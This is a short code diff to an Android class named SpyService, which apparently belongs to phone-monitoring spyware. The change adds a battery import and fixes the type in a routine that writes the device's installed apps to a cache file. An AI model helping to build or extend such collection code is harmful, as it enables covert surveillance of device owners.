@@ -19,6 +19,7 @@ import android.net.NetworkInfo;
 import android.net.Uri;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
@@ -288,8 +289,8 @@ public class SpyService extends Service {
         File f = new File(getCacheDir(), "apps.txt");
         PrintWriter pw = new PrintWriter(f);
         PackageManager pm = getPackageManager();
-        List<PackageManager.PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_META_DATA);
-        for (PackageManager.PackageInfo p : packages) {
+        List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_META_DATA);
+        for (android.content.pm.PackageInfo p : packages) {
             String name = p.packageName;
             String label = pm.getApplicationLabel(p.applicationInfo).toString();
             pw.println(label + " (" + name + ")");
